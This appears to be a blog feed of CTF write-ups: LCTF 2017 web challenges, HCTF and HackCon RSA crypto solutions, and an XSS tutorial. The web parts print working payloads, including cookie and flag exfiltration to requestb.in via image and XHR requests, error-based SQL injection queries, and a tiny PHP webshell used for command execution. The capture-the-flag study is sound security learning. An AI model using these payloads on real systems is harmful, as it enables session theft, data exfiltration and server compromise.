class="attr">content</span>=<span class="string">"PHPSESSID=naao04610f8lfg7mj4qfg6s7p4; path=/"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">nonce</span>=<span class="string">"909593a1d3183240d3be316e15628657"</span>&gt;</span><span class="undefined">(new Image()).src='https://requestb.in/rooalgro?cookie='+escape(document.cookie)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>get flag<br><img src="http://heartsky.info/images/LCTF/20171121213832_PaZOec_5.jpeg" alt=""></p><h3 id="“他们”有什么秘密呢"><a href="#“他们”有什么秘密呢" class="headerlink" title="“他们”有什么秘密呢?"></a>“他们”有什么秘密呢?</h3><p>过滤了 database tables users columns schema information 的数字型 sql 注入</p><p>因为对其他的都没限制，所以思路就是通过显注查询得到表名、列名，最后查出数据，但是过滤了表名和列名的查询关键字</p><h4 id="库名"><a href="#库名" class="headerlink" title="库名"></a>库名</h4><p>可以通过查询不存在的表名来获得数据库名<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pro_id=1 union select 1 from a</span><br><span class="line"></span><br><span class="line">Table &apos;youcanneverfindme17.a&apos; doesn&apos;t exist</span><br></pre></td></tr></table></figure></p><p>数据库名 <code>youcanneverfindme17</code></p><h4 id="表名"><a href="#表名" class="headerlink" title="表名"></a>表名</h4><p>表名列名查了好久的资料都没找到，后来看了别人的 payload，自己真是太菜了</p><p><a href="http://www.wupco.cn/?p=4117%EF%BF%BC%E5%B0%B1%E6%98%AF%E8%BF%99%E4%B8%AA" target="_blank" rel="external">mysql注入可报错时爆表名、字段名、库名</a></p><p>(waf 都是一样的…</p><p>看下官方文档会发现，不只文中提到的 Polygon 函数，所有创建几何值(Create Geometry Values)的函数，其接收的参数都是 Point、LineString、Polygon 等不同于数字、字符串的数据类型，如果我们传递是非要求的数据类型就会报错(确切的说 MySQL 把它当做了列名，然后从表中取出相应列的数据)，更进一步如果是已存在的字段的话就会报出库名、表名、列名<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select MultiPoint(a) from users;</span><br><span class="line">ERROR 1054 (42S22): Unknown column &apos;a&apos; in &apos;field list&apos;</span><br><span class="line">mysql&gt; select MultiPoint(id) from users;</span><br><span class="line">ERROR 1367 (22007): Illegal non geometric &apos;`test`.`users`.`id`&apos; value found during parsing</span><br></pre></td></tr></table></figure></p><p>ps: 比较独特的是 Point 函数不可以，因为它接收两个数字类型的参数，所以表中的字符串型数据就被强制转换为了数字，仍然正常运行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select Point(user,a) from users;</span><br><span class="line">ERROR 1054 (42S22): Unknown column &apos;a&apos; in &apos;field list&apos;</span><br><span class="line">mysql&gt; select Point(user,pass) from users;</span><br><span class="line">+---------------------------+</span><br><span class="line">| Point(user,pass)          |</span><br><span class="line">+---------------------------+</span><br><span class="line">|                         |</span><br><span class="line">|                         |</span><br><span class="line">+---------------------------+</span><br></pre></td></tr></table></figure></p><p>和 <code>select Point(0,0) from users</code> 的结果是一样的</p><h4 id="列名"><a href="#列名" class="headerlink" title="列名"></a>列名</h4><p>在可以用 union 但不知道列名的情况下是可以直接取出数据的，但是提示说也要找到列名<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- Tip:将表的某一个字段名，和表中某一个表值进行字符串连接，就可以得到下一个入口喽~ →</span></span><br></pre></td></tr></table></figure></p><p>可以这样<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pro_id=1 and (select * from (select * from product_2017ctf as a join product_2017ctf as b) as c)</span><br><span class="line"></span><br><span class="line">Duplicate column name &apos;pro_id&apos;</span><br></pre></td></tr></table></figure></p><p>原理是在使用别名的时候不能出现相同的字段名，而在这里我们用 join 把表扩成了两份</p><p>比如<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from test as a join test as b</span><br><span class="line">    -&gt; ;</span><br><span class="line">+------+------+------+------+</span><br><span class="line">| user | pass | user | pass |</span><br><span class="line">+------+------+------+------+</span><br><span class="line">| 1    | 2    | 1    | 2    |</span><br><span class="line">| test | 233  | 1    | 2    |</span><br><span class="line">| 1    | 2    | test | 233  |</span><br><span class="line">| test | 233  | test | 233  |</span><br><span class="line">+------+------+------+------+</span><br></pre></td></tr></table></figure></p><p>所以把这个表赋予别名查询的时候报错，然后用 using 来继续得到剩下的字段<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pro_id=1 and (select * from (select * from product_2017ctf as a join product_2017ctf as b using(pro_id)) as c)</span><br><span class="line"></span><br><span class="line">Duplicate column name &apos;pro_name&apos;</span><br></pre></td></tr></table></figure></p><p>所有字段<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pro_id pro_name owner d067a0fa9dc61a6e</span><br></pre></td></tr></table></figure></p><h4 id="取出数据"><a href="#取出数据" class="headerlink" title="取出数据"></a>取出数据</h4><p>拦截了 <code>d067a0fa9dc61a6e</code>，这时就要用到一种在不知道列名的情况下取出数据的方法</p><p>先给出 payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pro_id=0 union select 1,(select e.4 from (select * from (select 1)a,(select 2)b,(select 3)c,(select 4)d union select * from product_2017ctf)e limit 3,1),3,4</span><br><span class="line"></span><br><span class="line">product name:7195ca99696b5a896.php</span><br></pre></td></tr></table></figure></p><p>重点是这句<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from (select 1)a,(select 2)b,(select 3)c,(select 4)d union select * from product_2017ctf</span><br></pre></td></tr></table></figure></p><p>本地试下就知道了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from (select 1)a,(select 2)b,(select 3)c union select * from users;</span><br><span class="line">+---+-------+-------+</span><br><span class="line">| 1 | 2     | 3     |</span><br><span class="line">+---+-------+-------+</span><br><span class="line">| 1 | 2     | 3     |</span><br><span class="line">| 1 | test  | test  |</span><br><span class="line">| 2 | test2 | test2 |</span><br><span class="line">+---+-------+-------+</span><br></pre></td></tr></table></figure></p><p>可以看到在原有表的基础上新增了一行数据，而且列名成了 1 2 3，所以接下来只要把它作为一个新表并赋予一个别名给它，<code>select e.4</code> 即查询第四列，然后用 limit 控制下第几行就可以取出所有数据了</p><p>得到下一关地址 <code>d067a0fa9dc61a6e7195ca99696b5a896.php</code></p><p>是一个上传文件的站点，测试下得到基本信息<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">文件名可控</span><br><span class="line">目录名根据ip变化</span><br><span class="line">只能写入七个字符</span><br><span class="line">覆盖写</span><br></pre></td></tr></table></figure></p><p>根据七个字符的关键词很容易就能找到下面这个 WebShell<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>=`*`;</span><br></pre></td></tr></table></figure></p><p>相当于在 Linux 的终端上执行 <code>*</code><br>这时就有一个骚操作了<br>新建一个空的名为 bash 的文件和一个名为 bash2 的内容为 <code>whoami</code> 的文件，执行 *</p><p><img src="http://heartsky.info/images/LCTF/20171121121954_ubrcLg_3.jpeg" alt=""></p><p>命令执行过程为 bash bash2，即执行 bash2 脚本里的内容<br>ps: 需要注意的是 * 按照首字母排序，所以写入 WebShell 的文件首字母要在 b 之后(bash 命令对于多个文件名参数，后面的文件会忽略掉)</p><p>写入以下文件，成功命令执行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">filename=z.php&amp;content=&lt;?=`*`;</span><br><span class="line">filename=bash&amp;content=[任意内容]</span><br><span class="line">filename=bash2&amp;content=ls /*</span><br></pre></td></tr></table></figure></p><p>发现根目录下存在 <code>/327a6c4304ad5938eaf0efb6cc3e53dc.php</code>，读取它的内容<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">filename=bash2&amp;content=cat /3*</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">$flag = &quot;LCTF&#123;n1ver_stop_nev2r_giveup&#125;&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>虽然是已知知识的结合，但感觉很不错，学到了很多骚操作，另外也提醒自己要关注最新的技术 = =</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;这次趁着周末有些时间，做了西电师傅们的 LCTF，整场下来感觉质量可以，没有太大的脑洞。&lt;/p&gt;
&lt;h3 id=&quot;Simple-blog&quot;&gt;&lt;a href=&quot;#Simple-blog&quot; class=&quot;headerlink&quot; title=&quot;Simple blog&quot;&gt;&lt;/a&gt;S
      
    
    </summary>
    
    
      <category term="CTF" scheme="http://heartsky.info/tags/CTF/"/>
    
      <category term="writeup" scheme="http://heartsky.info/tags/writeup/"/>
    
  </entry>
  
  <entry>
    <title>HCTF 2017 Crypto writeup</title>
    <link href="http://heartsky.info/2017/11/14/HCTF-2017-Crypto-writeup/"/>
    <id>http://heartsky.info/2017/11/14/HCTF-2017-Crypto-writeup/</id>
    <published>2017-11-13T16:22:50.000Z</published>
    <updated>2018-10-26T06:08:42.432Z</updated>
    
    <content type="html"><![CDATA[<h3 id="BabyRSA"><a href="#BabyRSA" class="headerlink" title="BabyRSA"></a>BabyRSA</h3><p>先看下题目的逻辑</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">M = r * bytes_to_long(<span class="string">'hctf&#123;'</span> + sha256(open(<span class="string">'./flag'</span>).read()).hexdigest() + <span class="string">'&#125;'</span>)</span><br><span class="line">S = pow(M, d, n)</span><br></pre></td></tr></table></figure><p>程序接收 r，然后同 flag 相乘后计算出它的数字签名<br>先说下本来的思路，flag 为 m，单纯 flag 的签名为 S，返回的签名为 S’,如果我们构造 <code>r=R^e</code><br>因为<br><img src="http://heartsky.info/images/hctf2017/20171115140246_H97HFB_1.jpeg" alt=""><br>所以</p><p><img src="http://heartsky.info/images/hctf2017/20171115140129_3prZOm_Screenshot.jpeg" alt=""><br>e 的值未知，通过爆破 e 的值遍历提交 R^e，再根据上式得出 flag</p><p>但是题目忘记对 r 进行限制，导致也可以通过传入 <code>r=2</code> 来做出<br><img src="http://heartsky.info/images/hctf2017/20171115140313_QcgiTv_Screenshot.jpeg" alt=""><br>因为 <code>2m &lt; n</code>，所以直接对 S’^e 除以 2 就是 m</p><p>ps: Blue-Whale 队师傅的解法<br><img src="http://heartsky.info/images/hctf2017/20171115140338_1PfOVh_Screenshot.jpeg" alt=""><br>然后对 m^2 开方就是 flag 了</p><h3 id="WeakRSA"><a href="#WeakRSA" class="headerlink" title="WeakRSA"></a>WeakRSA</h3><p>已知部分 d 的最低有效位，是可以还原出 d 的，<a href="http://honors.cs.umd.edu/reports/lowexprsa.pdf" target="_blank" rel="external">原理</a>部分。但对于已知的位数是有要求的<br><img src="http://heartsky.info/images/hctf2017/20171114202034_YLmofD_579ADAE3-7403-40C6-AD48-6CF840EE9B3A.jpeg" alt=""><br>其中 <code>M=2^k</code>，k 是 d 的最低有效位的位数<br>出题时没测试好，本来是要给的位数不够还原，需要爆破的，给下脚本<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys, re</span><br><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> nroot</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> size</span><br><span class="line"></span><br><span class="line">n = <span class="number">24129492308224479830531863430667763206113500947912894148049103046436751018902380216549212087945014575866175372699327952352562583984599024982322742653474650254469019243745562427155195911292231061633627557914070970650388286259815766552728485153840458510677169495483383264554397982155108666923510839292748291941615629484247125025729363254239159271724680451974211566266307311323012908187153011368890695841034381925365547836453167672856111790684457634738536647974450864723943635507973978195453912898978987904396630176208142995219377309529324099766495068346782530074954504554550936100220114319876296005855618193837568032249</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">low_d2 = <span class="number">585021050422437790400309277934736421671174903453118287773262727237276990096608684311252820485289582300237832073420122197911787329400438609843024619449229662477502424617432168933632994437196549098808097025413678738558952555239079729908003264517051128647960060385270607296895534639200191803399174999679917012421</span></span><br><span class="line">low_bits = <span class="number">1028</span></span><br><span class="line">test = pow(<span class="number">3</span>, e, n)</span><br><span class="line"></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line">prefix = []</span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> range(<span class="number">2</span>):</span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> range(<span class="number">2</span>):</span><br><span class="line">        prefix.append(str(a) + str(b))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> bf <span class="keyword">in</span> prefix:</span><br><span class="line">    low_d = int(bin(low_d2)[<span class="number">2</span>:], <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> xrange(<span class="number">1</span>, e):</span><br><span class="line">        d = (k * n + <span class="number">1</span>) / e</span><br><span class="line">        d &gt;&gt;= low_bits</span><br><span class="line">        d &lt;&lt;= low_bits</span><br><span class="line">        d |= low_d</span><br><span class="line">        <span class="keyword">if</span> (e * d) % k == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">if</span> pow(test, d, n) == <span class="number">3</span>:</span><br><span class="line">                    <span class="keyword">print</span> k, d</span><br></pre></td></tr></table></figure></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>因为出题出的太晚了，导致没多少时间测试，出现了非预期，向各位师傅抱歉了 ==</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;BabyRSA&quot;&gt;&lt;a href=&quot;#BabyRSA&quot; class=&quot;headerlink&quot; title=&quot;BabyRSA&quot;&gt;&lt;/a&gt;BabyRSA&lt;/h3&gt;&lt;p&gt;先看下题目的逻辑&lt;/p&gt;
&lt;figure class=&quot;highlight py&quot;&gt;&lt;table&gt;&lt;
      
    
    </summary>
    
    
      <category term="CTF" scheme="http://heartsky.info/tags/CTF/"/>
    
      <category term="writeup" scheme="http://heartsky.info/tags/writeup/"/>
    
  </entry>
  
  <entry>
    <title>浅谈 XSS 发送外域请求</title>
    <link href="http://heartsky.info/2017/08/30/%E6%B5%85%E8%B0%88-XSS-%E5%8F%91%E9%80%81%E5%A4%96%E5%9F%9F%E8%AF%B7%E6%B1%82/"/>
    <id>http://heartsky.info/2017/08/30/浅谈-XSS-发送外域请求/</id>
    <published>2017-08-30T15:59:16.000Z</published>
    <updated>2017-11-15T06:18:36.000Z</updated>
    
    <content type="html"><![CDATA[<p>在 xss 中，我们不只要通过 <code>alert(1)</code> 弹窗来验证是否存在 xss 漏洞，更多的是让管理员访问我们的 payload(比如后台审核留言) 来对外域发起请求从而获取管理员 cookie、后台地址、源码等。本文只介绍几种常见的方式，仅针对一般情况，并不针对有过滤和 CSP 的情况。</p><h3 id="HTML-标签"><a href="#HTML-标签" class="headerlink" title="HTML 标签"></a>HTML 标签</h3><p>第一类是 img、video、audio、iframe、a 等标签，他们的 src 或 href 属性可以让他们对外域发起请求。</p><p>第二类是含有可以执行 JS 的属性的标签，具体属性如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">formaction action href xlink:href autofocus src content data</span><br></pre></td></tr></table></figure></p><p>比如(虽然太明显了。跳转的话可能更适合 CTF 吧，毕竟不用考虑同源问题了。<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">formaction</span>=<span class="string">javascript:location.href</span>=<span class="string">"xxx"</span>&gt;</span>click me</span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>第三类是可以执行事件的标签，因为事件就是定义了发生一个动作后要执行的 JS 代码。有下面这些：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">onload onunload onchange onsubmit onreset onselect onblur onfocus onabort onkeydown onkeypress onkeyup onclick ondbclick onmouseover onmousemove onmouseout onmouseup onforminput onformchange ondrag ondrop</span><br></pre></td></tr></table></figure></p><p>注意下面几点：</p><ul><li>有闭合标签的标签可以不闭合标签，浏览器会自动帮其闭合</li><li>任意一个标签都有 onclick 和 onmouseover 属性，包括自定义标签</li><li>标签属性值之间可以用空格 TAB 换行符 加号</li></ul><p>以及作为 XSS 来说最重要的 HTML 属性值是不能拼接的，因此不能通过第一类方法获取 cookie 等额外信息。不过 JS 的话是可以的。</p><h3 id="JS-脚本"><a href="#JS-脚本" class="headerlink" title="JS 脚本"></a>JS 脚本</h3><p>分为直接写出来 <code>&lt;script&gt;xxxx&lt;/script&gt;</code> 和引入 <code>&lt;script src=xxxx&gt;&lt;/script&gt;</code> 的方式。</p><p>以 HITB 2017 的 Website 题为例，<code>http://47.88.218.105:20010/action.php?callback=getInfo</code> 是存在 xss 的，会无过滤的把 callback 参数值回显出来，而我们可以提交 URL，并且 bot 会模拟点击，所以我们可以提交一个我们的 php 页面让他跳转到这个页面，把 getInfo 替换成我们的 JS。</p><h4 id="跳转"><a href="#跳转" class="headerlink" title="跳转"></a>跳转</h4><p>简单粗暴<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.location = xxx</span><br><span class="line">location.href = xxx</span><br><span class="line"><span class="built_in">window</span>.location = xxx</span><br></pre></td></tr></table></figure></p><p>因为这题因为 cookie 是 httponly 的，所以只能让管理员模拟 getFlag 请求然后再把结果页面发送回来，所以光跳转就不够用了，只能采用下面的方法</p><h3 id="xhr-XMLHttpRequest"><a href="#xhr-XMLHttpRequest" class="headerlink" title="xhr(XMLHttpRequest)"></a>xhr(XMLHttpRequest)</h3><p>通用 payload<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line"><span class="built_in">window</span>.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">var</span> html =<span class="built_in">document</span>.body.innerHTML;</span><br><span class="line">    <span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">    xhr.open(<span class="string">"GET"</span>,<span class="string">"http://47.88.218.105:20010/getflag.php?csrftoken="</span>+html.slice(html.indexOf(<span class="string">'token'</span>)+<span class="number">8</span>,html.indexOf(<span class="string">"error"</span>)<span class="number">-3</span>), <span class="string">"true"</span>);</span><br><span class="line">    xhr.onreadystatechange = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> xhr2 = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">xhr2.open(<span class="string">"GET"</span>,<span class="string">"https://requestb.in/xkto8txk?flag="</span>+xhr.responseText,<span class="string">"true"</span>);</span><br><span class="line">        xhr2.send();</span><br><span class="line">    &#125;</span><br><span class="line">    xhr.send();</span><br><span class="line">&#125;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure></p><h4 id="jQuery"><a href="#jQuery" class="headerlink" title="jQuery"></a>jQuery</h4><p>和上面的思路一样，但是换了种形式</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=<span class="string">'https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js'</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line">&lt;script&gt;</span><br><span class="line"><span class="built_in">window</span>.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> html =<span class="built_in">document</span>.body.innerHTML;</span><br><span class="line">    $.get(<span class="string">'getflag.php?csrftoken='</span>+html.slice(html.indexOf(<span class="string">'token'</span>)+<span class="number">8</span>,html.indexOf(<span class="string">"error"</span>)<span class="number">-3</span>),<span class="function"><span class="keyword">function</span>(<span class="params">data</span>)</span>&#123;$.post(<span class="string">'https://requestb.in/xkto8txk'</span>,&#123;<span class="attr">name</span>:data&#125;);&#125;);&#125; </span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><p>值得注意的是 getflag.php 页面注入的 JS 是在 csrftoken 所在的 html 前面，因此要延时执行或者等整个页面加载完再执行，这个地方坑了我。</p><p>先这样，有需要再补充，明天早起赶火车 = =</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;在 xss 中，我们不只要通过 &lt;code&gt;alert(1)&lt;/code&gt; 弹窗来验证是否存在 xss 漏洞，更多的是让管理员访问我们的 payload(比如后台审核留言) 来对外域发起请求从而获取管理员 cookie、后台地址、源码等。本文只介绍几种常见的方式，仅针对一般
      
    
    </summary>
    
    
      <category term="XSS" scheme="http://heartsky.info/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>HackCon 2017 RSA-3 writeup</title>
    <link href="http://heartsky.info/2017/08/29/HackCon-2017-RSA-3-writeup/"/>
    <id>http://heartsky.info/2017/08/29/HackCon-2017-RSA-3-writeup/</id>
    <published>2017-08-29T12:55:33.000Z</published>
    <updated>2018-10-26T06:08:42.428Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>I was finally able to capture the modulos and ciphertext that my friend uses to send the flag to everyone. Please hack it, and tell me what he is sending.<br>Note: Different flag format.</p><p><a href="https://hackcon.in/files/257f1bd531bea7b6a29a700bd949b42f/rsa3.txt" target="_blank" rel="external">rsa3.txt</a></p></blockquote><p>We are giving following data:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">n = 27889790942966947036861378043158080483040875117204641483879866390238208620663956576973777874507240669643888065763137780499805909939066661612708826993608654680300732401951416830721424144957953976708056088725541261145598655543913301108486073727361975257751155861693187124732625567462532590982339774968025316953820269111867532777587735148492283985886531900163665810672858631477638383286430874438461463017230692713981299647992939576135711541276805459680629858238737522674183159028538781619179277007783213596156511625151052311022548741688444363119109174839265715141719292947895928622131533978133711731642378245705631956649</span><br><span class="line">ciphertext = 27565432352959169185267553837899918221071526625835688441598442671911411122049381510509743510890496110212243616256779662952985804971850105832078504709537095259376624037980191442815236496206629132445698638752008471224630238657804976392808705657174518751058814995018236045588302953757877948476094692393461773107162692398429932051387701451649957934778348969875044313103315581471155771861778522866249975693209102641771607970433761749835749459436417356404889295590430882236042943244986093685207061420612079333415995591395030262118706403057290219600617207992171928187137731325872336342093957597097019557095193031636012448452</span><br><span class="line"></span><br><span class="line">......</span><br></pre></td></tr></table></figure></p><p>That have 1000 group of n and c, so many!<br>Firstly, I think that could have the same factor. But failed. All n are relatively prime. Stuck! I am no idea. So I begin to do other things. </p><p>Suddenly I’m aware of that if e are same(should be same), it might be done by Chinese remainder theorem. You can understand it at <a href="https://en.wikipedia.org/wiki/Chinese_remainder_theorem" target="_blank" rel="external">wiki</a>, I will not explain it.  But no e, don’t worry, we can blast it. So I write a python script to solve the challenge.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long, long_to_bytes</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="comment"># get all n and c</span></span><br><span class="line">s = open(<span class="string">'file.txt'</span>).read().split(<span class="string">'\n'</span>)</span><br><span class="line">num = <span class="number">0</span></span><br><span class="line">n = []</span><br><span class="line">c = [] </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(s)):</span><br><span class="line">    <span class="keyword">if</span> num % <span class="number">3</span> == <span class="number">0</span>:</span><br><span class="line">        n.append(int(s[i].split(<span class="string">' '</span>)[<span class="number">2</span>]))</span><br><span class="line">    <span class="keyword">elif</span> num % <span class="number">3</span> == <span class="number">1</span>:</span><br><span class="line">        c.append(int(s[i].split(<span class="string">' '</span>)[<span class="number">2</span>]))</span><br><span class="line">    num += <span class="number">1</span></span><br><span class="line">le = len(n)</span><br><span class="line"></span><br><span class="line"><span class="comment"># calc N</span></span><br><span class="line">N = <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> num <span class="keyword">in</span> n:</span><br><span class="line">    N *= num</span><br><span class="line"></span><br><span class="line"><span class="comment"># N1,N2...Nn</span></span><br><span class="line"><span class="comment"># NN1 * t1 = 1 (mod n1)</span></span><br><span class="line">NN = [<span class="keyword">None</span>] * le</span><br><span class="line">t =  [<span class="keyword">None</span>] * le</span><br><span class="line">x = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(le):</span><br><span class="line">    NN[i] = N / n[i]</span><br><span class="line">    t[i] = gmpy2.invert(NN[i],n[i])</span><br><span class="line">    x += c[i]*t[i]*NN[i]</span><br><span class="line"></span><br><span class="line">res = x % N</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>, <span class="number">65537</span>):</span><br><span class="line">    num = <span class="number">0</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span 